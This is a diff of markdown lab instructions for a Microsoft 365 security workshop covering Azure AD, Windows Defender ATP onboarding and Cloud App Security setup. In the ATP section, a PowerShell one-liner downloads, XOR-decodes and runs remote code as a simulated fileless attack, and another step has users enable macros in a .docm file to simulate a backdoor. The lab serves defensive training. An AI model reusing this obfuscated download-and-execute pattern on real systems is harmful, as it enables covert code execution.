@@ -80,9 +80,10 @@ There are a few prerequisites that need to be set up to complete all the section
 
 - [Workplace Join Clients](#workplace-join-clients)
 
+- [Connect MCAS to Office 365](#connect-mcas-to-office-365)
+
 ===
 # Azure AD Connect Configuration
-[🔙](#lab-environment-configuration)
 
 In this task, we will install Azure AD Connect and configure it using the express settings.
 
@@ -120,7 +121,6 @@ In this task, we will install Azure AD Connect and configure it using the expres
 10. [] Continue to next task while initial sync is running.
 ===
 # Redeem Azure Pass
-[🔙](#lab-environment-configuration)
 
 For several of the exercises in this lab series, you will require an active subscription.  We are providing an Azure Pass for this purpose.  You will be provided with an Azure Pass code to use with the instructions below.
 
@@ -178,7 +178,6 @@ For several of the exercises in this lab series, you will require an active subs
 1. [] When you are redirected to the Azure Portal, the process is complete.
 ===
 # Assign User Licenses
-[🔙](#lab-environment-configuration)
 
 In this task, we will assign licenses to users that have been synced to the Office 365 portal.
 
@@ -246,7 +245,6 @@ In this task, we will link Windows Defender ATP licenses to your demo tenant.
 	> [!NOTE] This license allows up to 100 systems to connect to the WD ATP service.
 ===
 # Windows Defender ATP Onboarding
-[🔙](#introduction)
 
 In this task, we will perform initial setup of WD ATP and onboard 2 machines.
 
@@ -294,13 +292,13 @@ In this task, we will perform initial setup of WD ATP and onboard 2 machines.
 1. [] Copy **WindowsDefenderATPLocalOnboardingScript** to the desktop.
 1. [] Right-click on **WindowsDefenderATPLocalOnboardingScript** and click **Run as Administrator**.
 1. [] Press **(Y)** to confirm onboarding.
-1. [] Run Attack Simulation #1 "Automated investigation (fileless attack)" by following the instructions below:
+1. [] Run **Attack Simulation #1 "Automated investigation (fileless attack)"** by following the instructions below:
 	1. [] Open a PowerShell window and click on the code below to type it in the window (please wait until you see **($decryptedBytes))** before pressing **Enter**):
 	
 	+++[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))+++
 
-1. [] Switch to @lab.VirtualMachine(AdminPC).SelectLink and run Attack Simulation #2 "Automated investigation (backdoor)" by following the instructions below:
-	1. [] On the desktop, double-click on RS4_WinATP-Intro-Invoice.docm and enter +++WDATP!diy#+++ when prompted for a password.
+1. [] Switch to @lab.VirtualMachine(AdminPC).SelectLink and run **Attack Simulation #2 "Automated investigation (backdoor)"** by following the instructions below:
+	1. [] On the desktop, double-click on **RS4_WinATP-Intro-Invoice.docm** and enter +++WDATP!diy#+++ when prompted for a password.
 	2. [] Once the file opens, in the **Security Warning** ribbon, click **Enable Content**.
 	3. [] Click **OK** to confirm the attack.
 	4. [] Press **Enter** to close the command prompt window.
@@ -355,7 +353,25 @@ In this task, we will join 3 systems to the Azure AD tenant to provide SSO capab
 
 	+++pass@word1+++
 1. [] Click **Done**.
+===
+# Connect MCAS to Office 365 
+[🔙](#microsoft-365-cloud-app-security)
 
+1. [] On @lab.VirtualMachine(Client01).SelectLink, open a new tab and go to +++https://portal.cloudappsecurity.com+++
+1. [] Go to the gear icon and select **App connectors** 
+
+	!IMAGE[GetImage.png](\Media\GetImage.png)
+ 
+1. [] Click on the **+** button and select Office 365 
+ 
+	!IMAGE[45gka6qw.jpg](\Media\45gka6qw.jpg)
+1. [] Click on **Connect Office 365**
+ 
+	!IMAGE[x58w8p6v.jpg](\Media\x58w8p6v.jpg)
+1. [] Click on **Test now** to validate the configuration 
+ 
+	!IMAGE[a4c31yrk.jpg](\Media\a4c31yrk.jpg)
+ 
 ===
 
 # Azure Information Protection
@@ -1471,9 +1487,11 @@ In this task, we will create a new SharePoint site and enable Information Rights
 
 	!IMAGE[twsp6mvj.jpg](\Media\twsp6mvj.jpg)
 
-1. [] Dismiss any introductory screens and, at the top of the page, click **+Create site**.
+1. [] Dismiss any introductory screens and, at the top of the page, click **+ Create site**.
 
 	!IMAGE[7v8wctu2.jpg](\Media\7v8wctu2.jpg)
+
+	[!NOTE] If you do not see the **+ Create site** button, resize the VM window by dragging the divider for the instructions to the right until the VM resizes and you can see the button.
  
 1. [] On the Create a site page, click **Team site**.
 
@@ -1613,25 +1631,7 @@ The main sections covered in this Lab are:
 - [Conditional Access App Control](#conditional-access-app-control)
 - [Management](#management)
 - [Information Protection](#information-protection)
-===
-# Connect MCAS to Office 365 
-[🔙](#microsoft-365-cloud-app-security)
 
-1. [] On @lab.VirtualMachine(Client01).SelectLink, open a new tab and go to +++https://portal.cloudappsecurity.com+++
-1. [] Go to the gear icon and select **App connectors** 
-
-	!IMAGE[GetImage.png](\Media\GetImage.png)
- 
-1. [] Click on the **+** button and select Office 365 
- 
-	!IMAGE[45gka6qw.jpg](\Media\45gka6qw.jpg)
-1. [] Click on **Connect Office 365**
- 
-	!IMAGE[x58w8p6v.jpg](\Media\x58w8p6v.jpg)
-1. [] Click on **Test now** to validate the configuration 
- 
-	!IMAGE[a4c31yrk.jpg](\Media\a4c31yrk.jpg)
- 
 ===
 # Cloud Discovery
 [🔙](#microsoft-365-cloud-app-security)
